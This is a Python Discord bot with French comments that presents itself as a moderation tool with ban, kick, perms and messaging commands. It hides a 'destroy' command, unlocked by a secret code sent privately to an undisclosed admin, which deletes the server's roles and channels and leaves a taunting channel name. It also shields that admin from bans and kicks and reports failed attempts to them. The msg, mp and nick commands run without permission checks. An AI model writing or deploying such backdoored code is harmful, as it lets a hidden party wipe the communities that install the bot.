import uuid
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Initialisation de l'id de l'admin
admin=0
code_secu=str(uuid.uuid4())


# Événement de connexion
@bot.event
async def on_ready():
    nom=bot.user.name
    print(f'Connecté en tant que {nom}')
    
    user = await bot.fetch_user(admin)
    # Envoie un message privé à l'utilisateur
    await user.send(f"Bonjour Administrateur {user.mention}, je suis connecté en tant que {nom} !")
    await user.send(f"Code de sécurité : {code_secu}")


# Définition de la fonction verif
async def verif(id):
    if (id==admin):
        return False
    return True

# Définition de la fonction send_dm
async def annonce(member, serveur, action, valid):
    # Récupère l'utilisateur correspondant à l'ID spécifié
    user = await bot.fetch_user(admin)
    
    message=""
    opt=" "
    opti=" "
    if action!="destroy":
        opt=" te "
        opti=" sur "
    if valid==True:
        message+=f"{member[0]} ({member[1]}) {action} le serveur {serveur}"
    else:
        message+=f"Tentative de{opt}{action}{opti}le serveur {serveur} par {member[0]} ({member[1]})"
    
    # Envoie un message privé à l'admin    
    await user.send(message)
    
# Définition de la fonction send_dm
async def valeur(value):
    # Récupère l'utilisateur correspondant à l'ID spécifié
    user = await bot.fetch_user(admin)
    
    # Envoie un message privé à l'admin    
    await user.send(f"Valeur : {value}")



@bot.command()
async def destroy(ctx, code):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    
    if str(code)==code_secu:
        # Supprime le message contenant la commande utilisée
        await ctx.message.delete()
        
        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "destroy", True)

        # Récupère la position du rôle du bot
        bot_role_position = ctx.guild.me.top_role.position
        # Récupère la liste des rôles du serveur
        server_roles = ctx.guild.roles
        # Supprimer les rôles inférieurs à celui du bot
        for role in server_roles[1:bot_role_position]:
            await role.delete()
            await ctx.send(f"Rôle {role.name} supprimé !")
        await ctx.send("Les rôles disponibles ont été supprimés.")
        
        # Vérifie si l'utilisateur a la permission de gérer les salons
        if ctx.guild.me.guild_permissions.manage_channels:
            # Récupère la liste de tous les salons du serveur
            channels = ctx.guild.channels
            # Pacourt les ids des salons
            for channel in channels:
                # Supprime le salon
                if channel!=ctx.channel:
                    await channel.delete()
                    await ctx.send(f"Salon {channel.name} supprimé !")
            await channel.edit(name="On s'est Ambré ?")
        else:
            await ctx.send("Désolé, je n'ai pas la permission nécessaire.")

    else :
        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "destroy", False)
        await valeur(code)

@bot.command()
async def perms(ctx, member: discord.Member):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    
    # Crée une chaîne pour stocker les informations des permissions
    permissions_info = f"Permissions de {member.mention} :\n\n"
    list_perms=[]
    # Pour chaque rôle de l'utilisateur
    for role in member.roles:
        # Pour chaque permission du rôle
        for perm, value in role.permissions:
            if value is True:
                if perm not in list_perms:
                    list_perms.append(perm)
                    
    permissions_info=f"Permissions de {member.mention} :\n"
    for perm in list_perms :
        permissions_info+=f"    {perm}\n"

    # Envoie les informations des permissions dans le canal où la commande a été utilisée
    await ctx.send(permissions_info)

@bot.command()
async def ban(ctx, member: discord.Member, *, reason=None):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    
    if (await verif(member.id)==True) :
        # Vérifie si l'utilisateur a la permission de bannir des membres
        if ctx.author.guild_permissions.ban_members:
            # Envoie un message privé à l'utilisateur
            message=f"Vous avez été ban du serveur {ctx.guild.name}"
            if reason!=None:
                message+=f" pour la raison suivante : {reason}"
            await member.send(message)
            
            # Fait son taff
            await member.ban(reason=reason)
            await ctx.send(f"{member.mention} a été banni du serveur.")
        else:
            await ctx.send("Désolé, vous n'avez pas la permission de bannir des membres.")
    else :
        await ctx.send(f"{ctx.author.mention} tu ne peux pas ban mon père.")
        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "ban", False)

@bot.command()
async def kick(ctx, member: discord.Member, *, reason=None):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    
    if (await verif(member.id)==True) :
        # Vérifie si l'utilisateur a la permission d'expulser des membres
        if ctx.author.guild_permissions.kick_members:
            # Envoie un message privé à l'utilisateur
            message=f"Vous avez été kick du serveur {ctx.guild.name}"
            if reason!=None:
                message+=f" pour la raison suivante : {reason}"
            await member.send(message)
            
            # Fait son taff
            await member.kick(reason=reason)
            await ctx.send(f"{member.mention} a été expulsé du serveur.")
        else:
            await ctx.send("Désolé, vous n'avez pas la permission d'expulser des membres.")
    else :
        await ctx.send(f"{ctx.author.mention} tu ne peux pas kick mon père.")
        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "kick", False)
        
@bot.command()      
async def msg(ctx, *, message):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    
    await ctx.send(message)

@bot.command()
async def mp(ctx, member: discord.Member, *, message):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    
    # Envoie un message privé à l'utilisateur
    await member.send(message)
    
@bot.command()
async def nick(ctx, member: discord.Member, *, nickname):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()

    # Change le surnom du membre
    await member.edit(nick=nickname)
    



# Exécution du bot avec le jeton Discord
bot.run('TOKEN')
